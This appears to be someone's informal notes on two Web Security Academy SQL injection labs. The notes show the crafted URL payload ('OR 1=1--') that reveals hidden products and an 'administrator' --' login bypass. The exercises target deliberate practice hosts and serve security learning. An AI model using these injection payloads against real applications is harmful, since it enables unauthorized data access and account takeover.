This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

i grabbed the url which is https://0af100d004b4ee8484cf8bf7001900b0.web-security-academy.net/filter?category=Gifts+OR+1=1--

gave me 
![](attachments/FIRST%20ONE.png)

now modifying the url a bit 
adding ' after gifts on above url gives the results
https://0af100d004b4ee8484cf8bf7001900b0.web-security-academy.net/filter?category=Gifts%20%27%20+or+1=1%20--



# lab2
clicked on the login page 
https://0a7c008c04611bca82e7c45f0036007d.web-security-academy.net/login
and inputted admininstrator ' --
and random word for password
which solved the lab


